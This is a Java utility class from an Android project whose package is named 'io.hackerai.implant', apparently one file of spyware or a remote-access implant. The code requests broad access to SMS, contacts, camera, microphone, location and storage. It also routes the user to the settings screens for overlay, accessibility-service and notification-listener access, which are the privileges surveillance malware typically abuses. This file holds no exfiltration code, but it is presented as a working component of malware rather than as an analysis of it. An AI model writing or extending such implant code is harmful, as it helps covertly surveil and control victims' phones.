// ============================================================
// FILE 17: utils/PermUtils.java
// ============================================================
package io.hackerai.implant.utils;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

/**
 * PermUtils — automatic runtime permission management.
 *
 * Handles:
 *   - Dangerous permission granting (overlay, notifications, etc.)
 *   - SYSTEM_ALERT_WINDOW (overlay) via Settings intent
 *   - WRITE_SETTINGS via Settings intent
 *   - SCHEDULE_EXACT_ALARM via Settings intent
 *   - AccessibilityService / NotificationListenerService enablement
 *   - Package install permission for self-update
 */
public class PermUtils {
    private static final String TAG = "PermUtils";

    // Dangerous permissions needed at runtime (Android 6+)
    private static final String[] DANGEROUS_PERMS = {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.POST_NOTIFICATIONS,
    };

    /**
     * Request all dangerous permissions (requires Activity context).
     * Call from onResume() or onStart().
     */
    public static void requestDangerousPerms(Activity activity) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return;

        for (String perm : DANGEROUS_PERMS) {
            if (ContextCompat.checkSelfPermission(activity, perm)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(activity, new String[]{perm}, 1001);
            }
        }
    }

    /**
     * Grant overlay permission (SYSTEM_ALERT_WINDOW).
     * On Android 6+ this requires user to toggle a Settings switch.
     */
    public static boolean ensureOverlayPermission(Context context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true;

        if (!Settings.canDrawOverlays(context)) {
            Intent intent = new Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + context.getPackageName())
            );
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            return false;
        }
        return true;
    }

    /**
     * Grant WRITE_SETTINGS permission.
     * On Android 6+ this requires user to toggle a Settings switch.
     */
    public static boolean ensureWriteSettingsPermission(Context context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true;

        if (!Settings.System.canWrite(context)) {
            Intent intent = new Intent(
                    Settings.ACTION_MANAGE_WRITE_SETTINGS,
                    Uri.parse("package:" + context.getPackageName())
            );
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            return false;
        }
        return true;
    }

    /**
     * Grant SCHEDULE_EXACT_ALARM permission (Android 12+).
     * Needed for setExact() / setExactAndAllowWhileIdle().
     */
    public static boolean ensureExactAlarmPermission(Context context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) return true;

        android.app.AlarmManager am =
                (android.app.AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        if (am != null && !am.canScheduleExactAlarms()) {
            Intent intent = new Intent(
                    Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM,
                    Uri.parse("package:" + context.getPackageName())
            );
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            return false;
        }
        return true;
    }

    /**
     * Open NotificationListenerService settings so user can enable it.
     */
    public static void ensureNotificationListener(Context context) {
        String enabledListeners = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ENABLED_NOTIFICATION_LISTENERS
        );
        if (enabledListeners != null && enabledListeners.contains(context.getPackageName())) {
            return; // already granted
        }
        // Open notification listener settings
        Intent intent = new Intent(
                "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"
        );
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    /**
     * Open accessibility settings so user can enable our service.
     */
    public static void ensureAccessibilityService(Context context) {
        String enabledSvcs = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        );
        if (enabledSvcs != null && enabledSvcs.contains(context.getPackageName())) {
            return; // already enabled
        }
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    /**
     * Open app notification settings so user can grant POST_NOTIFICATIONS.
     */
    public static void openAppNotificationSettings(Context context) {
        Intent intent = new Intent();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            intent.setAction(Settings.ACTION_APP_NOTIFICATION_SETTINGS);
            intent.putExtra(Settings.EXTRA_APP_PACKAGE, context.getPackageName());
        } else {
            intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.parse("package:" + context.getPackageName()));
        }
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    /** Check if all dangerous permissions are granted */
    public static boolean hasAllDangerousPerms(Context context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true;
        for (String perm : DANGEROUS_PERMS) {
            // Skip permissions that don't exist on this API level
            try {
                if (ContextCompat.checkSelfPermission(context, perm)
                        != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            } catch (Exception e) {
                // Permission not defined on this API level — skip
                Log.v(TAG, "Skipping permission check: " + perm);
            }
        }
        return true;
    }

    /** Get list of all denied dangerous permissions */
    public static String[] getDeniedPerms(Context context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M)
            return new String[0];

        java.util.ArrayList<String> denied = new java.util.ArrayList<>();
        for (String perm : DANGEROUS_PERMS) {
            try {
                if (ContextCompat.checkSelfPermission(context, perm)
                        != PackageManager.PERMISSION_GRANTED) {
                    denied.add(perm);
                }
            } catch (Exception ignored) {}
        }
        return denied.toArray(new String[0]);
    }

    /** Log current permission state */
    public static void logPermissionState(Context context) {
        StringBuilder sb = new StringBuilder("Permissions:\n");
        for (String perm : DANGEROUS_PERMS) {
            try {
                boolean granted = ContextCompat.checkSelfPermission(context, perm)
                        == PackageManager.PERMISSION_GRANTED;
                sb.append("  ").append(perm).append(": ").append(granted ? "✓" : "✗").append("\n");
            } catch (Exception ignored) {}
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            sb.append("  SYSTEM_ALERT_WINDOW: ")
              .append(Settings.canDrawOverlays(context) ? "✓" : "✗").append("\n");
            sb.append("  WRITE_SETTINGS: ")
              .append(Settings.System.canWrite(context) ? "✓" : "✗").append("\n");
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            android.app.AlarmManager am =
                    (android.app.AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            boolean canExact = am != null && am.canScheduleExactAlarms();
            sb.append("  SCHEDULE_EXACT_ALARM: ").append(canExact ? "✓" : "✗").append("\n");
        }
        Log.d(TAG, sb.toString());
    }
}
